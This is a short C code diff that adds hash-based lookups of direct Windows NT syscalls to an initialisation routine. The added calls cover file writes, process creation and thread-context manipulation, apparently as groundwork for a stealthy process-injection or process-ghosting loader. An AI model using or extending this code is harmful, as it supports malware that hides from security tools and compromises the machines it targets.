@@ -283,5 +283,29 @@ BOOL InitializeNtSyscalls(VOID) {
     if (!FetchNtSyscall(NtDelayExecution_HASH, &g_Nt.NtDelayExecution))
         return FALSE;
 
+    if (!FetchNtSyscall(NtOpenFile_HASH, &g_Nt.NtOpenFile))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtSetInformationFile_HASH, &g_Nt.NtSetInformationFile))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtWriteFile_HASH, &g_Nt.NtWriteFile))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtCreateProcessEx_HASH, &g_Nt.NtCreateProcessEx))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtQueryInformationProcess_HASH, &g_Nt.NtQueryInformationProcess))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtReadVirtualMemory_HASH, &g_Nt.NtReadVirtualMemory))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtGetContextThread_HASH, &g_Nt.NtGetContextThread))
+        return FALSE;
+
+    if (!FetchNtSyscall(NtSetContextThread_HASH, &g_Nt.NtSetContextThread))
+        return FALSE;
+
     return TRUE;
 }
